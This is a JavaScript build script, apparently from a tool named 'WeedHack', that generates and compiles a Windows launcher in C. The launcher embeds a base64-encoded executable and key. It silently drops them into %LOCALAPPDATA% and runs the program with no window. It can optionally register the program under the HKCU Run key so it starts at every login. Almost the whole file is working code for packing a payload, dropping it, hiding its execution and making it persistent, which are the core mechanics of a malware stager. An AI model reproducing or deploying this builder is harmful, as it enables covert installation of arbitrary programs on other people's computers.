// language: JavaScript, file: builder/compile.js
// live-compiles the launcher per build. key + config + base baked in as C literals.
// config fields honored: dest, exeName, keyFile, args[], persist.
// if key is empty, the server generates one (caller passes the account key or a fresh gen).

import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';

const execFileP = promisify(execFile);

const CC = process.env.MINGW_CC || 'x86_64-w64-mingw32-gcc';

function clit(s) {
  return '"' + String(s).replace(/\\/g, '\\\\').replace(/"/g, '\\"').replace(/\n/g, '\\n') + '"';
}

function cSource({ keyB64, cfgB64, baseB64 }) {
  return `
// auto-generated launcher — do not edit
#include <windows.h>
#include <shlobj.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static const char KEY_B64[]  = ${clit(keyB64)};
static const char CFG_B64[]  = ${clit(cfgB64)};
static const char BASE_B64[] = ${clit(baseB64)};

static int b64val(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

static unsigned char *b64decode(const char *in, DWORD *out_len) {
    size_t n = strlen(in);
    unsigned char *out = (unsigned char *)malloc(n / 4 * 3 + 4);
    if (!out) return NULL;
    DWORD o = 0;
    int quad[4]; int qi = 0;
    for (size_t i = 0; i < n; i++) {
        char c = in[i];
        if (c == '=') break;
        int v = b64val(c);
        if (v < 0) continue;
        quad[qi++] = v;
        if (qi == 4) {
            out[o++] = (unsigned char)((quad[0] << 2) | (quad[1] >> 4));
            out[o++] = (unsigned char)(((quad[1] & 0xF) << 4) | (quad[2] >> 2));
            out[o++] = (unsigned char)(((quad[2] & 0x3) << 6) | quad[3]);
            qi = 0;
        }
    }
    if (qi == 2) {
        out[o++] = (unsigned char)((quad[0] << 2) | (quad[1] >> 4));
    } else if (qi == 3) {
        out[o++] = (unsigned char)((quad[0] << 2) | (quad[1] >> 4));
        out[o++] = (unsigned char)(((quad[1] & 0xF) << 4) | (quad[2] >> 2));
    }
    *out_len = o;
    return out;
}

static int write_file(const wchar_t *path, const unsigned char *data, DWORD len) {
    HANDLE f = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f == INVALID_HANDLE_VALUE) return -1;
    DWORD w = 0;
    BOOL ok = WriteFile(f, data, len, &w, NULL);
    CloseHandle(f);
    return (ok && w == len) ? 0 : -1;
}

static int make_dir(const wchar_t *path) {
    wchar_t tmp[2048]; wcsncpy(tmp, path, 2048); tmp[2047] = 0;
    for (wchar_t *p = tmp + 1; *p; p++) {
        if (*p == L'\\\\') { *p = 0; CreateDirectoryW(tmp, NULL); *p = L'\\\\'; }
    }
    if (!CreateDirectoryW(tmp, NULL)) {
        if (GetLastError() != ERROR_ALREADY_EXISTS) return -1;
    }
    return 0;
}

static int expand_env(const wchar_t *in, wchar_t *out, DWORD cap) {
    DWORD n = ExpandEnvironmentStringsW(in, out, cap);
    return (n > 0 && n <= cap) ? 0 : -1;
}

static void json_str(const char *json, const char *field, char *out, size_t out_cap) {
    char pat[64]; _snprintf(pat, sizeof(pat), "\\"%s\\"", field);
    char *p = strstr(json, pat);
    if (!p) return;
    p = strchr(p, ':'); if (!p) return;
    p = strchr(p, '"'); if (!p) return;
    p++;
    char *q = strchr(p, '"'); if (!q) return;
    size_t n = (size_t)(q - p);
    if (n >= out_cap) n = out_cap - 1;
    memcpy(out, p, n); out[n] = 0;
}

static int json_bool(const char *json, const char *field, int def) {
    char pat[64]; _snprintf(pat, sizeof(pat), "\\"%s\\"", field);
    char *p = strstr(json, pat);
    if (!p) return def;
    p = strchr(p, ':'); if (!p) return def;
    p++;
    while (*p == ' ' || *p == '\\t') p++;
    if (strncmp(p, "true", 4) == 0) return 1;
    if (strncmp(p, "false", 5) == 0) return 0;
    return def;
}

static void json_args(const char *json, char *out, size_t out_cap) {
    out[0] = 0;
    char *p = strstr(json, "\\"args\\"");
    if (!p) return;
    p = strchr(p, ':'); if (!p) return;
    p = strchr(p, '['); if (!p) return;
    char *end = strchr(p, ']'); if (!end) return;
    p++;
    size_t o = 0;
    int first = 1;
    while (p < end) {
        while (p < end && (*p == ' ' || *p == ',' || *p == '\\t' || *p == '\\n' || *p == '\\r')) p++;
        if (p >= end || *p == ']') break;
        if (!first && o < out_cap - 1) out[o++] = ' ';
        first = 0;
        if (*p == '"') {
            p++;
            while (p < end && *p != '"' && o < out_cap - 1) out[o++] = *p++;
            if (p < end && *p == '"') p++;
        } else {
            while (p < end && *p != ',' && *p != ']' && *p != ' ' && o < out_cap - 1) out[o++] = *p++;
        }
    }
    out[o] = 0;
}

int wmain(void) {
    DWORD key_len = 0, cfg_len = 0, base_len = 0;
    unsigned char *key  = b64decode(KEY_B64,  &key_len);
    unsigned char *cfg  = b64decode(CFG_B64,  &cfg_len);
    unsigned char *base = b64decode(BASE_B64, &base_len);
    if (!key || !cfg || !base) return 1;

    char cfg_buf[8192] = {0};
    DWORD copy = cfg_len < sizeof(cfg_buf) - 1 ? cfg_len : sizeof(cfg_buf) - 1;
    memcpy(cfg_buf, cfg, copy);

    char dest[1024]   = "%LOCALAPPDATA%\\\\yc";
    char exeName[256] = "program.exe";
    char keyFile[256] = "key.json";
    char args[2048]   = "";
    int  persist      = 0;

    json_str(cfg_buf, "dest",    dest,    sizeof(dest));
    json_str(cfg_buf, "exeName", exeName, sizeof(exeName));
    json_str(cfg_buf, "keyFile", keyFile, sizeof(keyFile));
    json_args(cfg_buf, args, sizeof(args));
    persist = json_bool(cfg_buf, "persist", 0);

    wchar_t dest_src[1024], dest_w[1024];
    MultiByteToWideChar(CP_UTF8, 0, dest, -1, dest_src, 1024);
    if (expand_env(dest_src, dest_w, 1024) != 0) return 1;
    if (make_dir(dest_w) != 0) return 1;

    wchar_t base_path[2048], key_path[2048];
    _snwprintf(base_path, 2048, L"%ls\\\\%hs", dest_w, exeName);
    _snwprintf(key_path,  2048, L"%ls\\\\%hs", dest_w, keyFile);

    if (write_file(base_path, base, base_len) != 0) return 1;
    if (write_file(key_path,  key,  key_len)  != 0) return 1;

    if (persist) {
        HKEY hk;
        if (RegOpenKeyExW(HKEY_CURRENT_USER,
                          L"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
                          0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
            RegSetValueExW(hk, L"WeedHack", 0, REG_SZ,
                           (const BYTE *)base_path,
                           (DWORD)((wcslen(base_path) + 1) * sizeof(wchar_t)));
            RegCloseKey(hk);
        }
    }

    wchar_t cmd[4096];
    if (args[0]) {
        wchar_t args_w[2048];
        MultiByteToWideChar(CP_UTF8, 0, args, -1, args_w, 2048);
        _snwprintf(cmd, 4096, L"\\"%ls\\" %ls", base_path, args_w);
    } else {
        _snwprintf(cmd, 4096, L"\\"%ls\\"", base_path);
    }

    STARTUPINFOW si = {0}; PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    if (CreateProcessW(base_path, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, dest_w, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    free(key); free(cfg); free(base);
    return 0;
}
`;
}

export async function compileLauncher({ key, config, baseExe }) {
  // no throw here — the route decides the fallback. key may be empty.
  const useKey  = (key && String(key).trim().length > 0) ? String(key).trim() : '';

  const keyB64  = Buffer.from(useKey, 'utf8').toString('base64');
  const cfgB64  = Buffer.from(JSON.stringify(config || {}), 'utf8').toString('base64');
  const baseB64 = fs.readFileSync(baseExe).toString('base64');

  const workDir = fs.mkdtempSync(path.join(os.tmpdir(), 'wh-build-'));
  const srcPath = path.join(workDir, 'l.c');
  const outPath = path.join(workDir, 'l.exe');

  fs.writeFileSync(srcPath, cSource({ keyB64, cfgB64, baseB64 }));

  try {
    await execFileP(CC, [
      '-O2', '-s', '-municode',
      '-o', outPath,
      srcPath,
      '-lshell32', '-ladvapi32',
    ], { timeout: 60_000, maxBuffer: 32 * 1024 * 1024 });

    const buf = fs.readFileSync(outPath);
    return buf;
  } finally {
    try { fs.rmSync(workDir, { recursive: true, force: true }); } catch {}
  }
}